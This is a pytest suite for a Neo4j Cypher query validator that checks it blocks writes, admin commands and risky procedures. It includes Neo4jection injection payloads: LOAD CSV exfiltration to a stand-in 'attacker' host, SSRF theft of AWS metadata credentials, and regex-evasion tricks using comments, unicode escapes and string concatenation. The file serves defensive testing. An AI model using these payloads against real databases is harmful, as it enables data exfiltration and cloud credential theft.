from unittest.mock import AsyncMock, MagicMock

import pytest

from reporting import settings
from reporting.schema.mcp_config import ToolParamDef
from reporting.services import query_validator
from reporting.services.query_validator import ValidationResult, validate_query, validate_tool_cypher
from tests.query_validator_cases import (
    ADMIN_COMMAND_FUZZ_CASES,
    ALLOWED_PROCEDURE_CASES,
    DANGEROUS_READ_PATH_FUZZ_CASES,
    DISALLOWED_PROCEDURE_CASES,
    READ_ONLY_CALL_SUBQUERY_CASES,
    USE_CLAUSE_FALSE_POSITIVE_CASES,
    USE_CLAUSE_FUZZ_CASES,
    WRITE_QUERY_TYPE_FUZZ_CASES,
)


def _mock_cyver(
    mocker,
    syntax_notifications=None,
    syntax_exception=None,
    schema_ok=True,
    schema_meta=None,
    props_ok=True,
    props_meta=None,
    query_type="r",
):
    """Mock the EXPLAIN-based syntax/write check and CyVer schema/property validators.

    syntax_notifications: list of notification dicts returned by EXPLAIN summary.
    syntax_exception: if set, execute_query raises this exception instead.
    query_type: value for summary.query_type ('r', 'w', 'rw', 's').
    """
    mock_driver = MagicMock()
    if syntax_exception is not None:
        mock_driver.execute_query = AsyncMock(side_effect=syntax_exception)
    else:
        mock_summary = MagicMock()
        mock_summary.notifications = syntax_notifications or []
        mock_summary.query_type = query_type
        mock_driver.execute_query = AsyncMock(return_value=([], mock_summary, []))
    mocker.patch("reporting.services.query_validator._get_async_neo4j_client").return_value = mock_driver

    mocker.patch("reporting.services.query_validator.SchemaValidator").return_value.validate.return_value = (
        schema_ok,
        schema_meta if schema_meta is not None else [],
    )
    mocker.patch("reporting.services.query_validator.PropertiesValidator").return_value.validate.return_value = (
        props_ok,
        props_meta if props_meta is not None else [],
    )


# --- validate_tool_cypher: undeclared-parameter guard ---


async def test_validate_tool_cypher_flags_undeclared_parameters(mocker):
    # Isolate the parameter check from the DB-backed query validation.
    mocker.patch.object(
        query_validator,
        "validate_query",
        new=AsyncMock(return_value=ValidationResult(errors=[], warnings=["a warning"])),
    )
    result = await validate_tool_cypher(
        "MATCH (n) WHERE n.id = $cve_id RETURN n LIMIT $limit",
        [ToolParamDef(name="limit", type="integer")],
    )
    assert result.has_errors
    assert any("$cve_id" in err for err in result.errors)
    assert result.warnings == ["a warning"]  # query warnings are preserved


async def test_validate_tool_cypher_passes_when_all_parameters_declared(mocker):
    mocker.patch.object(
        query_validator,
        "validate_query",
        new=AsyncMock(return_value=ValidationResult(errors=[], warnings=[])),
    )
    result = await validate_tool_cypher(
        "MATCH (n) WHERE n.id = $cve_id RETURN n LIMIT $limit",
        [ToolParamDef(name="cve_id", type="string"), ToolParamDef(name="limit", type="integer")],
    )
    assert not result.has_errors


# --- validate_query returns ValidationResult ---


@pytest.mark.parametrize("query", DANGEROUS_READ_PATH_FUZZ_CASES)
async def test_dangerous_read_path_fuzz_cases_are_blocked(mocker, query):
    """Regex guards should block read-classified dangerous surfaces after EXPLAIN."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert result.has_errors


@pytest.mark.parametrize(("query_type", "query"), WRITE_QUERY_TYPE_FUZZ_CASES)
async def test_write_query_type_fuzz_cases_are_blocked(mocker, query_type, query):
    """Neo4j EXPLAIN classifications should block write/schema procedure variants."""
    _mock_cyver(mocker, query_type=query_type)
    result = await validate_query(query)
    assert result.has_errors


@pytest.mark.parametrize("query", READ_ONLY_CALL_SUBQUERY_CASES)
async def test_read_only_call_subquery_fuzz_cases_are_allowed(mocker, query):
    """Keep legitimate read-only CALL subquery shapes allowed while write forms block."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert not result.has_errors


@pytest.mark.parametrize("query", ADMIN_COMMAND_FUZZ_CASES)
async def test_admin_command_fuzz_cases_are_blocked(mocker, query):
    """Admin and DBMS-management surfaces should not validate as user queries."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert result.has_errors


@pytest.mark.parametrize("query", USE_CLAUSE_FUZZ_CASES)
async def test_use_clause_fuzz_cases_are_blocked(mocker, query):
    """The USE clause escapes Seizu's configured graph and is always blocked."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert result.has_errors


@pytest.mark.parametrize("query", USE_CLAUSE_FALSE_POSITIVE_CASES)
async def test_use_clause_false_positive_cases_are_allowed(mocker, query):
    """A `use` variable after a CASE THEN/ELSE must not trip the USE-clause guard."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert not result.has_errors


@pytest.mark.parametrize("query", DISALLOWED_PROCEDURE_CASES)
async def test_disallowed_procedure_cases_are_blocked(mocker, query):
    """Procedures outside the default allowlist are blocked after EXPLAIN."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert result.has_errors


@pytest.mark.parametrize("query", ALLOWED_PROCEDURE_CASES)
async def test_allowed_procedure_cases_are_permitted(mocker, query):
    """Side-effect-free built-in schema procedures validate cleanly by default."""
    _mock_cyver(mocker)
    result = await validate_query(query)
    assert not result.has_errors


class TestProcedureAllowlist:
    """QUERY_VALIDATOR_ALLOWED_PROCEDURES extends the default procedure allowlist."""

    async def test_apoc_procedure_blocked_by_default(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("CALL apoc.meta.stats() YIELD labelCount RETURN labelCount")
        assert result.has_errors

    async def test_exact_procedure_name_is_allowed_when_configured(self, mocker):
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc.meta.stats"])
        result = await validate_query("CALL apoc.meta.stats() YIELD labelCount RETURN labelCount")
        assert not result.has_errors

    async def test_exact_procedure_name_does_not_allow_siblings(self, mocker):
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc.meta.stats"])
        result = await validate_query("CALL apoc.load.json('http://attacker/') YIELD value RETURN value")
        assert result.has_errors

    async def test_namespace_prefix_allows_whole_namespace(self, mocker):
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc."])
        result = await validate_query("CALL apoc.coll.sum([1, 2, 3]) YIELD value RETURN value")
        assert not result.has_errors

    async def test_apoc_namespace_prefix_does_not_unblock_apoc_cypher_functions(self, mocker):
        """Procedure allowlisting does not permit arbitrary-Cypher functions."""
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc."])
        result = await validate_query("RETURN apoc.cypher.runFirstColumnSingle('RETURN 1', {}) AS r")
        assert result.has_errors

    async def test_gds_namespace_prefix_allows_gds_procedure_calls(self, mocker):
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["gds."])
        result = await validate_query("CALL gds.graph.list() YIELD graphName RETURN graphName")
        assert not result.has_errors

    async def test_gds_namespace_prefix_does_not_unblock_gds_functions(self, mocker):
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["gds."])
        result = await validate_query("RETURN gds.version() AS version")
        assert result.has_errors

    async def test_narrow_apoc_prefix_keeps_apoc_cypher_guarded(self, mocker):
        """A sub-namespace prefix must not drop the apoc.cypher.* guard."""
        _mock_cyver(mocker)
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc.coll."])
        result = await validate_query("RETURN apoc.cypher.runFirstColumnSingle('RETURN 1', {}) AS r")
        assert result.has_errors

    async def test_allowlist_cannot_override_explain_write_check(self, mocker):
        """Even an allowlisted namespace cannot permit a non-read procedure."""
        _mock_cyver(mocker, query_type="w")
        mocker.patch.object(settings, "QUERY_VALIDATOR_ALLOWED_PROCEDURES", ["apoc."])
        result = await validate_query("CALL apoc.create.node(['X'], {}) YIELD node RETURN node")
        assert result.has_errors


async def test_validate_query_success(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n")
    assert isinstance(result, ValidationResult)
    assert not result.has_errors
    assert result.errors == []
    assert result.warnings == []


async def test_validate_query_syntax_error_is_error(mocker):
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientError.Statement.SyntaxError",
                "description": "Syntax error at position 5",
            }
        ],
    )
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert len(result.errors) == 1
    assert result.warnings == []


async def test_validate_query_syntax_exception_is_error(mocker):
    """An exception raised by execute_query is treated as a syntax error."""

    class FakeSyntaxError(Exception):
        code = "Neo.ClientError.Statement.SyntaxError"
        message = "Invalid input 'MATC'"

    _mock_cyver(mocker, syntax_exception=FakeSyntaxError())
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert len(result.errors) == 1


async def test_validate_query_syntax_error_stops_further_validation(mocker):
    """When syntax fails, schema and property validators are not called."""
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientError.Statement.SyntaxError",
                "description": "bad syntax",
            }
        ],
    )
    schema_mock = mocker.patch("reporting.services.query_validator.SchemaValidator").return_value
    props_mock = mocker.patch("reporting.services.query_validator.PropertiesValidator").return_value

    await validate_query("MATC (n) RETURN n")

    schema_mock.validate.assert_not_called()
    props_mock.validate.assert_not_called()


async def test_validate_query_parameterized_query_with_params_no_error(mocker):
    """Parameterized queries with params provided validate cleanly."""
    _mock_cyver(mocker)  # clean EXPLAIN — params resolved the notification
    result = await validate_query(
        "MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)",
        params={"base_severity": "CRITICAL"},
    )
    assert not result.has_errors
    assert result.warnings == []


async def test_validate_query_parameterized_query_without_params_is_warning(mocker):
    """ParameterNotProvided during validation is a warning, not a blocking error."""
    _mock_cyver(
        mocker,
        syntax_notifications=[
            {
                "code": "Neo.ClientNotification.Statement.ParameterNotProvided",
                "description": "Missing parameters: base_severity",
            }
        ],
    )
    result = await validate_query("MATCH (c:CVE) WHERE c.base_severity = $base_severity RETURN count(c)")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Missing parameters" in result.warnings[0]


async def test_validate_query_write_is_error(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("CREATE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors
    assert any("Write" in str(e) for e in result.errors)
    assert result.warnings == []


async def test_validate_query_schema_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
    )
    result = await validate_query("MATCH (n:Foo) RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown label" in str(result.warnings[0])


async def test_validate_query_properties_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        props_ok=False,
        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
    )
    result = await validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown property" in str(result.warnings[0])


async def test_validate_query_multiple_warnings(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
        props_ok=False,
        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
    )
    result = await validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 2


async def test_validate_query_errors_and_warnings_independent(mocker):
    """Syntax error short-circuits; schema/property warnings are never added."""
    _mock_cyver(
        mocker,
        syntax_notifications=[{"code": "Neo.ClientError.Statement.SyntaxError", "description": "bad"}],
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label"}],
    )
    result = await validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert result.warnings == []


# --- Read-only enforcement (EXPLAIN query_type) ---


async def test_check_read_only_allows_match(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n")
    assert not result.has_errors


async def test_check_read_only_allows_optional_match(mocker):
    _mock_cyver(mocker)
    result = await validate_query("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m")
    assert not result.has_errors


async def test_check_read_only_allows_match_with_where(mocker):
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) WHERE n.name = 'x' RETURN n")
    assert not result.has_errors


async def test_check_read_only_allows_limit(mocker):
    """LIMIT is a valid read clause; EXPLAIN returns query_type='r'."""
    _mock_cyver(mocker)
    result = await validate_query("MATCH (n) RETURN n LIMIT 10")
    assert not result.has_errors


async def test_check_read_only_allows_unwind(mocker):
    _mock_cyver(mocker)
    result = await validate_query("UNWIND [1, 2, 3] AS x RETURN x")
    assert not result.has_errors


async def test_check_read_only_rejects_create(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("CREATE (n:Person {name: 'Alice'})")
    assert result.has_errors


async def test_check_read_only_rejects_merge(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("MERGE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors


async def test_check_read_only_rejects_delete(mocker):
    _mock_cyver(mocker, query_type="w")
    result = await validate_query("MATCH (n) DELETE n")
    assert result.has_errors


async def test_check_read_only_rejects_set(mocker):
    _mock_cyver(mocker, query_type="rw")
    result = await validate_query("MATCH (n) SET n.name = 'Bob' RETURN n")
    assert result.has_errors


class TestAdminCommandsBlocked:
    """Neo4j admin/catalog commands that EXPLAIN can classify as read."""

    async def test_show_settings_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "SHOW SETTINGS YIELD name, value WHERE name CONTAINS 'auth' RETURN name, value LIMIT 10"
        )
        assert result.has_errors

    async def test_show_procedures_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "SHOW PROCEDURES YIELD name, mode WHERE mode IN ['WRITE', 'DBMS', 'SCHEMA'] RETURN name, mode"
        )
        assert result.has_errors

    async def test_show_transactions_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "SHOW TRANSACTIONS YIELD transactionId, currentQuery RETURN transactionId, currentQuery LIMIT 5"
        )
        assert result.has_errors

    async def test_terminate_transaction_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "TERMINATE TRANSACTION 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message"
        )
        assert result.has_errors

    async def test_terminate_transactions_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "TERMINATE TRANSACTIONS 'neo4j-transaction-0' YIELD transactionId, message RETURN transactionId, message"
        )
        assert result.has_errors

    async def test_show_command_block_comment_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("SHOW /* hide */ SETTINGS YIELD name, value RETURN name, value LIMIT 1")
        assert result.has_errors

    async def test_show_command_unicode_keyword_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"SH\u004fW SETTINGS YIELD name, value RETURN name, value LIMIT 1")
        assert result.has_errors

    async def test_show_command_unicode_space_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"SHOW\u0020SETTINGS YIELD name, value RETURN name, value LIMIT 1")
        assert result.has_errors

    async def test_terminate_command_block_comment_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "TERMINATE /* hide */ TRANSACTION 'neo4j-transaction-0' "
            "YIELD transactionId, message RETURN transactionId, message"
        )
        assert result.has_errors

    async def test_terminate_command_unicode_keyword_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            r"TERM\u0049NATE TRANSACTION 'neo4j-transaction-0' "
            "YIELD transactionId, message RETURN transactionId, message"
        )
        assert result.has_errors

    async def test_show_functions_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("SHOW FUNCTIONS YIELD name RETURN name LIMIT 5")
        assert result.has_errors

    async def test_show_indexes_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("SHOW INDEXES YIELD name RETURN name LIMIT 5")
        assert result.has_errors

    async def test_show_constraints_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("SHOW CONSTRAINTS YIELD name, type RETURN name, type LIMIT 5")
        assert result.has_errors

    async def test_show_all_indexes_modifier_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("SHOW ALL INDEXES YIELD name, type RETURN name, type LIMIT 5")
        assert result.has_errors

    async def test_show_typed_indexes_modifier_is_blocked(self, mocker):
        _mock_cyver(mocker)
        index_types = ("RANGE", "LOOKUP", "TEXT", "POINT", "VECTOR", "FULLTEXT")
        for index_type in index_types:
            result = await validate_query(f"SHOW {index_type} INDEXES YIELD name, type RETURN name, type LIMIT 5")
            assert result.has_errors

    async def test_stop_database_is_blocked_if_explain_classifies_read(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("STOP DATABASE neo4j")
        assert result.has_errors

    async def test_start_database_is_blocked_if_explain_classifies_read(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("START DATABASE neo4j")
        assert result.has_errors


class TestGDSBlocked:
    """GDS procedures/functions with side effects outside normal Cypher writes."""

    async def test_gds_graph_project_procedure_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("CALL gds.graph.project('probe', '*', '*') YIELD graphName RETURN graphName")
        assert result.has_errors

    async def test_gds_graph_project_function_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "MATCH (source)-[r]->(target) "
            "WITH gds.graph.project('probe', source, target) AS graph "
            "RETURN graph.graphName"
        )
        assert result.has_errors

    async def test_gds_quoted_graph_project_function_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "MATCH (source)-[r]->(target) "
            "WITH `gds`.`graph`.`project`('probe', source, target) AS graph "
            "RETURN graph.graphName"
        )
        assert result.has_errors

    async def test_gds_full_quoted_function_namespace_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("RETURN `gds.version`() AS version")
        assert result.has_errors

    async def test_gds_version_function_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("RETURN gds.version() AS version")
        assert result.has_errors

    async def test_gds_write_mode_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "CALL gds.pageRank.write('probe', {writeProperty: 'pagerank'}) "
            "YIELD nodePropertiesWritten RETURN nodePropertiesWritten"
        )
        assert result.has_errors

    async def test_gds_mutate_mode_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "CALL gds.pageRank.mutate('probe', {mutateProperty: 'pagerank'}) "
            "YIELD nodePropertiesWritten RETURN nodePropertiesWritten"
        )
        assert result.has_errors

    async def test_gds_comment_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("CALL /* hide */ gds.graph.list() YIELD graphName RETURN graphName")
        assert result.has_errors

    async def test_gds_quoted_namespace_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("CALL `gds`.`graph`.`list`() YIELD graphName RETURN graphName")
        assert result.has_errors

    async def test_apoc_quoted_namespace_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("CALL `apoc`.`load`.`json`('http://169.254.169.254/') YIELD value RETURN value")
        assert result.has_errors

    async def test_gds_unicode_bypass_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"C\u0041LL gds.graph.list() YIELD graphName RETURN graphName")
        assert result.has_errors


# --- Neo4jection attack vector tests (from Varonis research) ---
# Reference: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits


class TestNeo4jectionStringInjection:
    """Injection payloads that attempt to break out of string comparisons."""

    async def test_or_true_with_clause_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_property_filter_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("'=' LOAD CSV FROM 'http://attacker/' as l WITH 0 as _l00 RETURN 1 //")
        assert result.has_errors


class TestNeo4jectionUnionInjection:
    """UNION-based injection to append attacker-controlled queries."""

    async def test_node_property_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("'}) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
        assert result.has_errors

    async def test_label_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("a) RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //")
        assert result.has_errors

    async def test_relationship_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'}]-() RETURN 1 UNION MATCH (n) LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionDataExfiltration:
    """LOAD CSV-based data exfiltration attacks."""

    async def test_label_enumeration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0"
        )
        assert result.has_errors

    async def test_property_extraction_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
            "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    async def test_json_exfiltration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 0 as _0 MATCH (n) "
            "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    async def test_load_csv_standalone(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("LOAD CSV FROM 'http://attacker/data' AS row RETURN row")
        assert result.has_errors


class TestNeo4jectionAPOCExploits:
    """Attacks using APOC procedures for system access."""

    async def test_systemdb_graph_exfiltration(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
            "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) "
            "as l RETURN 1 //"
        )
        assert result.has_errors

    async def test_procedure_enumeration_neo4j4(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors

    async def test_apoc_cypher_run_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
            '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
            "UNWIND names AS name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionCloudMetadata:
    """Cloud metadata SSRF attacks via LOAD CSV / APOC."""

    async def test_aws_imdsv1_credential_theft(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
            "AS roles UNWIND roles AS role "
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
            "+role as l RETURN l"
        )
        assert result.has_errors

    async def test_aws_imdsv2_token_via_apoc(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "CALL apoc.load.csvParams("
            '"http://169.254.169.254/latest/api/token", '
            '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
            '"",{header:FALSE}) yield list '
            "WITH list[0] as token RETURN token"
        )
        assert result.has_errors

    async def test_load_csv_unicode_keyword_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"LO\u0041D CSV FROM 'http://169.254.169.254/' AS row RETURN row")
        assert result.has_errors

    async def test_load_csv_unicode_space_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"LOAD\u0020CSV FROM 'http://169.254.169.254/' AS row RETURN row")
        assert result.has_errors

    async def test_call_apoc_unicode_keyword_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"C\u0041LL apoc.load.json('http://169.254.169.254/') YIELD value RETURN value")
        assert result.has_errors

    async def test_call_apoc_unicode_space_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(r"CALL\u0020apoc.load.json('http://169.254.169.254/') YIELD value RETURN value")
        assert result.has_errors

    async def test_apoc_cypher_unicode_namespace_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            r"RETURN apoc.cyph\u0065r.runFirstColumnSingle('SHOW SETTINGS YIELD name RETURN count(*)', {}) AS count"
        )
        assert result.has_errors

    async def test_load_csv_block_comment_bypass(self, mocker):
        # Confirmed exploitable: LOAD /* x */ CSV bypassed \bLOAD\s+CSV\b and
        # Neo4j made the actual HTTP request before this fix was applied.
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD /* bypass */ CSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line"
        )
        assert result.has_errors

    async def test_load_csv_many_block_comment_starts_is_blocked(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD /*" + ("a/*" * 500) + "*/ CSV FROM 'http://169.254.169.254/' AS line RETURN line"
        )
        assert result.has_errors

    async def test_call_apoc_block_comment_bypass(self, mocker):
        # CALL /* x */ apoc. bypassed \bCALL\s+apoc\. regex.
        _mock_cyver(mocker)
        result = await validate_query(
            "CALL /* bypass */ apoc.load.json('http://169.254.169.254/latest/meta-data/') YIELD value RETURN value"
        )
        assert result.has_errors

    async def test_load_csv_line_comment_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "LOAD //\nCSV FROM 'http://169.254.169.254/latest/meta-data/' AS line RETURN line"
        )
        assert result.has_errors

    async def test_apoc_cypher_function_ssrf_via_string_concat(self, mocker):
        # String concatenation splits 'CALL ' and 'apoc.' so \bCALL\s+apoc\.
        # does not match, but apoc.cypher.runFirstColumnSingle executes the
        # concatenated inner query. Caught by \bapoc\.cypher\. on the original.
        _mock_cyver(mocker)
        result = await validate_query(
            "WITH 'CALL ' + 'apoc.load.json($url) YIELD value RETURN value'"
            " AS q RETURN apoc.cypher.runFirstColumnSingle(q, {url: $url}) AS data"
        )
        assert result.has_errors

    async def test_comment_stripper_url_slash_slash_hides_token(self, mocker):
        # The // in http:// inside a string literal was treated as a Cypher
        # line comment, stripping apoc.cypher.runFirstColumnSingle from the
        # stripped query so the SSRF regex never saw it.
        # Fixed by also checking the regex against the original (un-stripped) query.
        _mock_cyver(mocker)
        result = await validate_query(
            "WITH 'CALL ' + 'apoc.load.json(\"http://169.254.169.254/\") YIELD value RETURN value'"
            " AS q RETURN apoc.cypher.runFirstColumnSingle(q, {}) AS data"
        )
        assert result.has_errors

    async def test_apoc_cypher_run_first_column_single(self, mocker):
        # apoc.cypher.runFirstColumnSingle is an APOC function (no CALL keyword)
        # that executes arbitrary inner Cypher, bypassing the validator entirely.
        _mock_cyver(mocker)
        result = await validate_query(
            "RETURN apoc.cypher.runFirstColumnSingle('MATCH (n) RETURN n.id LIMIT 1', {}) AS r"
        )
        assert result.has_errors

    async def test_apoc_cypher_segment_quoted_function_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "RETURN `apoc`.`cypher`.`runFirstColumnSingle`('MATCH (n) RETURN n.id LIMIT 1', {}) AS r"
        )
        assert result.has_errors

    async def test_apoc_cypher_comment_before_dot_bypass(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "RETURN apoc/*hide*/.cypher.runFirstColumnSingle('MATCH (n) RETURN n.id LIMIT 1', {}) AS r"
        )
        assert result.has_errors

    async def test_apoc_cypher_run_first_column_many(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query("RETURN apoc.cypher.runFirstColumnMany('MATCH (n) RETURN n', {}) AS r")
        assert result.has_errors

    async def test_apoc_cypher_ssrf_via_touppper_concat(self, mocker):
        # Confirmed SSRF execution: toUpper('call') constructs 'CALL' at runtime
        # so no literal 'CALL apoc.' appears in the query string. Caught by
        # \bapoc\.cypher\. on the outer function name.
        _mock_cyver(mocker)
        result = await validate_query(
            "RETURN apoc.cypher.runFirstColumnSingle("
            "toUpper('call') + ' apoc.load.json(\"http://169.254.169.254/\") YIELD value RETURN value'"
            ", {}) AS r"
        )
        assert result.has_errors

    async def test_apoc_cypher_ssrf_via_string_split_concat(self, mocker):
        # 'CALL apoc' + '.load.json(...)' splits CALL apoc. across two literals
        # so \bCALL\s+apoc\. never matches. Caught by \bapoc\.cypher\.
        _mock_cyver(mocker)
        result = await validate_query(
            "RETURN apoc.cypher.runFirstColumnSingle("
            "'CALL apoc' + '.load.json(\"http://169.254.169.254/\") YIELD value RETURN value'"
            ", {}) AS r"
        )
        assert result.has_errors

    async def test_apoc_cypher_ssrf_via_char_array_join(self, mocker):
        # Constructs CALL apoc.load.json(...) from a character array via
        # apoc.text.join — no dangerous literal anywhere in the query.
        # Caught by \bapoc\.cypher\.
        _mock_cyver(mocker)
        result = await validate_query(
            "WITH ['C','A','L','L',' ','a','p','o','c','.','l','o','a','d','.','j','s','o','n'] AS c "
            "RETURN apoc.cypher.runFirstColumnSingle(apoc.text.join(c,''), {}) AS r"
        )
        assert result.has_errors


class TestNeo4jectionUnicodeBypass:
    """Unicode escape sequences used to evade quote filtering."""

    async def test_unicode_quote_escape(self, mocker):
        _mock_cyver(mocker)
        result = await validate_query(
            "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
        )
        assert result.has_errors


